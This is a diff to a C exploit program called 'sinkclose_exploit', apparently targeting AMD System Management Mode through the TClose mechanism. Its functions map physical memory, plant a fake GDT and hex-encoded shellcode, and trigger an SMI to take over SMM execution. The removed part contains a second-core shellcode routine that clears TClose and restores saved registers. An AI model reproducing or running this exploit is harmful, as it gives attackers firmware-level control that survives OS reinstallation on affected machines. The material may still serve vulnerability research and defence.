@@ -495,7 +495,7 @@ void patch_shellcode_ptr(char* shellcode, UINT32 base_offset, UINT32 val)
 
 
 /// @brief  Copies the shellcode at CORE0_SHELLCODE_ADDRESS
-void prepare_shellcode_core0(UINT32 smi_entry_point) {
+void prepare_shellcode_core_main(UINT32 smi_entry_point) {
 
     // Get pointer to the needle and calculate function size
     void *ptr = memmem(
@@ -530,132 +530,12 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
 
     // Setup GDTR
     *(UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) = sizeof(FAKE_GDT) - 1;
-    printf("GDT Size (-1): %d\n", sizeof(FAKE_GDT) - 1);
     *(UINT32 *)((UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) + 1) = ORIGINAL_GDT;
     
-    hexdump(shellcode_page, 0x1000, CORE0_SHELLCODE_ADDRESS);
+    //hexdump(shellcode_page, 0x1000, CORE0_SHELLCODE_ADDRESS);
 
     unmap_physical_memory(shellcode_page, PAGE_SIZE);
 }
-
-
-/// @brief  Copies the shellcode at CORE1_SHELLCODE_ADDRESS
-void prepare_shellcode_core1(UINT32 smm_save_state_area, UINT64 address) {
-        char shellcode_core1[] =
-        // Clear TClose
-        "\xb9\x13\x01\x01\xc0" 						// mov ecx,0xc0010113
-        "\x0f\x32" 									// rdmsr
-        "\x83\xe0\xf3" 								// and eax,0xfffffff3
-        "\x0f\x30" 									// wrmsr
-
-        // Offset 12
-        // Write to BAR buffer
-        "\x90\x90\x90\x90\x90"                      // mov    ecx,0xd0800011
-        "\x90\x90\x90"                              // mov    BYTE PTR [ecx],0x71
-        "\x90\x90"                                  // xor    ecx,ecx
-
-        // Offset 22
-        // Restore RIP
-        "\xa1\x00\x32\x00\x00"                      // mov    eax,ds:0x3200
-        "\xB9\x78\xDF\xF4\xCE"                      // mov ecx, 0xcef4df78
-        "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-        "\xa1\x04\x32\x00\x00"                      // mov    eax,ds:0x3204
-        "\xB9\x7c\xDF\xF4\xCE"                      // mov ecx, 0xcef4df7c
-        "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-        // Offset 46
-        // Restore RSP
-        "\xa1\x08\x32\x00\x00"                      // mov    eax,ds:0x3208
-        "\xB9\xD8\xDF\xF4\xCE"                      // mov ecx, 0xcef4dfd8
-        "\x89\x01"                                  // mov    DWORD PTR [ecx],eax
-
-        "\xa1\x0C\x32\x00\x00"                      // mov    eax,ds:0x320C
-        "\xB9\xDC\xDF\xF4\xCE"                      // mov ecx, 0xcef4dfdc
-        "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-        // Offset 70
-        // Restore RBP
-        "\xa1\x10\x32\x00\x00"                      // mov    eax,ds:0x3210
-        "\xB9\xD0\xDF\xF4\xCE"                      // mov ecx, 0xcef4bfd0
-        "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-        "\xa1\x14\x32\x00\x00"                      // mov    eax,ds:0x3214
-        "\xB9\xD4\xDF\xF4\xCE"                      // mov ecx, 0xcef4bfd4
-        "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-        // Offset 94
-        // Restore CR3
-        "\xa1\x18\x32\x00\x00"                      // mov    eax,ds:0x3218
-        "\xB9\x50\xDF\xF4\xCE"                      // mov ecx, 0xcef4df50
-        "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-        "\xa1\x1C\x32\x00\x00"                      // mov    eax,ds:0x321C
-        "\xB9\x54\xDF\xF4\xCE"                      // mov ecx, 0xcef4df54
-        "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-        // Offset 118
-        // Set auto-halt restart 
-        // "\xB9\x41\x41\x41\x41"                      // mov ecx, SMM_BASE + FEC9
-        // "\x31\xc0"                                  // xor eax, eax
-        // "\x40"                                      // inc eax
-        // "\x89\x01"                                  // mov DWORD PTR [ecx],eax
-
-
-        // Write to BAR buffer
-        "\x90\x90\x90\x90\x90"                      // mov    ecx,0xd0800011
-        "\x90\x90\x90"                              // mov    BYTE PTR [ecx],0x69
-
-        // // loop
-        // "\xa1\x20\x32\x00\x00"                      // mov    eax,ds:0x3220
-        // "\x85\xc0"                                  // test   eax,eax
-        // "\x74\xf7"                                  // je     loop
-
-        "\x0f\xaa";                                // rsm
-
-    
-    #define SMM_SAVE_STATE__OFFSET_RIP 0x178
-    #define SMM_SAVE_STATE__OFFSET_RBP 0x1d0
-    #define SMM_SAVE_STATE__OFFSET_RSP 0x1d8
-    #define SMM_SAVE_STATE__OFFSET_CR3 0x150
-    #define SMM_SAVE_STATE__OFFSET_AUTO_HALT_RESTART 0xC9
-
-    patch_shellcode_ptr(
-        shellcode_core1, 
-        22, 
-        smm_save_state_area + SMM_SAVE_STATE__OFFSET_RIP
-    );
-
-    patch_shellcode_ptr(
-        shellcode_core1, 
-        46, 
-        smm_save_state_area + SMM_SAVE_STATE__OFFSET_RSP
-    );
-
-    patch_shellcode_ptr(
-        shellcode_core1, 
-        70, 
-        smm_save_state_area + SMM_SAVE_STATE__OFFSET_RBP
-    );
-
-    patch_shellcode_ptr(
-        shellcode_core1, 
-        94, 
-        smm_save_state_area + SMM_SAVE_STATE__OFFSET_CR3
-    );
-
-    // Patch auto-halt restart
-    // *((UINT32*)&shellcode_core1[119]) =
-    //      smm_save_state_area + SMM_SAVE_STATE__OFFSET_AUTO_HALT_RESTART;
-
-
-    void* shellcode_page = map_physical_memory(address, PAGE_SIZE);
-    memcpy(shellcode_page, shellcode_core1, sizeof(shellcode_core1) - 1);
-    hexdump((char *)shellcode_page, sizeof(shellcode_core1)-1, address);
-    unmap_physical_memory(shellcode_page, PAGE_SIZE);
-}
-
-
 
 
 struct x_mapping {
@@ -1154,39 +1034,18 @@ void sinkclose_exploit()
     BOOL res;
 
     // Get SMM base location
-    UINT64 smm_base_core0 = 0;
-    UINT64 smm_base_core_sec = 0;
-    do_read_msr_for_core(0, AMD_MSR_SMM_BASE_ADDRESS, &smm_base_core0);
-    printf("SMM Base for Core0: %016llx\n", smm_base_core0);
-    do_read_msr_for_core(CORENUM, AMD_MSR_SMM_BASE_ADDRESS, &smm_base_core_sec);
-    printf("SMM Base for Core_sec: %016llx\n", smm_base_core_sec);
+    UINT64 smm_base_core_main = 0;
+    do_read_msr_for_core(1, AMD_MSR_SMM_BASE_ADDRESS, &smm_base_core_main);
+    printf("SMM Base for Core1: %016llx\n", smm_base_core_main);
 
-    UINT64 smm_base_core1 = smm_base_core0 + SMM_BASE_DISTANCE;
-
-    printf("%016llx || %016llx\n", smm_base_core1, smm_base_core_sec);
-    if(smm_base_core1 != smm_base_core_sec) {
-        printf("SMM Base for Core1 is not as expected, make sure to select the correct thread sibling\n");
-        exit(-1);
-    }
-
-/*     uint64_t smm_tseg_mask = 0x000ffffff800600f;
-    do_write_msr_for_core(0, AMD_MSR_SMM_TSEG_MASK, smm_tseg_mask);
-    for (size_t i = 0; i < 32; i++)
-    {
-        amd_print_smm_tseg_addr_for_core(i);
-    }
-    do_write_msr_for_core(0, AMD_MSR_SMM_TSEG_MASK, 0x000ffffff8006003); */
-
-    UINT32 smm_entry_point_core0 = smm_base_core0 + AMD_SMI_HANDLER_ENTRY_POINT;
-    UINT32 smm_entry_point_core1 = smm_base_core1 + AMD_SMI_HANDLER_ENTRY_POINT;
-
+    UINT32 smm_entry_point_core_main = smm_base_core_main + AMD_SMI_HANDLER_ENTRY_POINT;
 
     // Set the fake GDT for core 0 and core 1
-    // 0xaef4b053 = smm_entry_point_core0 + 0x53
-    UINT32 gdt_cs_base = 0x100000000 - (smm_entry_point_core0 + 0x53) + CORE0_SHELLCODE_ADDRESS;
+    // 0xaef4b053 = smm_entry_point_core_main + 0x53
+    UINT32 gdt_cs_base = 0x100000000 - (smm_entry_point_core_main + 0x53) + CORE0_SHELLCODE_ADDRESS;
     printf("GDT cs_base: 0x%08x\n", gdt_cs_base);
-    printf("GDT cs_base + jump offset (overflow 32 bit): 0x%08lx\n", gdt_cs_base + (smm_entry_point_core0 + 0x53));
-    
+    printf("GDT cs_base + jump offset (overflow 32 bit): 0x%08lx\n", gdt_cs_base + (smm_entry_point_core_main + 0x53));
+
     void* gdt_physpage = map_physical_memory(0x00000000, PAGE_SIZE);
 
     // Set the tampered offset for the GDT located at 0xFFFFFFFF
@@ -1196,34 +1055,27 @@ void sinkclose_exploit()
     // +1 for the alignment since we GDTR is at 0xFFFFFFFF
     memcpy((char*)gdt_physpage, gdt + 1, sizeof(FAKE_GDT) - 1);
     
+    printf("GDT Size (-1): %d\n", sizeof(FAKE_GDT) - 1);
     printf("Hexdump GDT\n");
     hexdump((char*)gdt_physpage, 0x60, 0x00000000);
-
     free(gdt);
 
     struct SegmentDescriptor *sec_desc = (struct SegmentDescriptor *) &FAKE_GDT;
-
-
     printf("--- 32 Bit CS Descriptor ---\n");
     print_desc(&sec_desc[1]);
     printf("--- 64 Bit CS Descriptor ---\n");
     print_desc(&sec_desc[7]);
+    printf("--- 32 Bit DS Descriptor ---\n");
+    print_desc(&sec_desc[3]);    
 
     unmap_physical_memory(gdt_physpage, PAGE_SIZE);
 
     /* Physical Addresses
      - 0x00000000 -> FAKE GDT[1:]
-     - 0x00001000 -> Shellcode fore Core0  ()
-     - 0x00003000 -> Shellcode fore Core1  ()
-     - 0x00003200 -> Recovery Values for Core1
+     - 0x00001000 -> Shellcode fore Core_main  ()
     */
 
-    prepare_shellcode_core0(smm_entry_point_core0);
-
-    // This shellcode needs to patch the Save State Area
-    // for graceful return
-    prepare_shellcode_core1(smm_base_core1 + AMD_SMM_STATE_SAVE_AREA, CORE1_SHELLCODE_ADDRESS);
-    //prepare_shellcode_core1(smm_base_core0 + AMD_SMM_STATE_SAVE_AREA, CORE0_SHELLCODE_ADDRESS);
+    prepare_shellcode_core_main(smm_entry_point_core_main);
 
     // Prepare recursive paging structure    
 
@@ -1322,13 +1174,8 @@ void sinkclose_exploit()
     
     SW_SMI_CALL smi_call = { 0 };
     smi_call.rax = 0x31337;    
-    sinkclose_smi(&smi_call);
 
-    printf("Triggering exploit...\n");    
-
-    smi_call.rax = 0x31338;
-    // Sets the TClose on Core0 (And Core1 due to Hyperthreading)
-     
+    printf("Triggering exploit...\n");         
     // Trigger attack    
     sinkclose_smi(&smi_call);
     
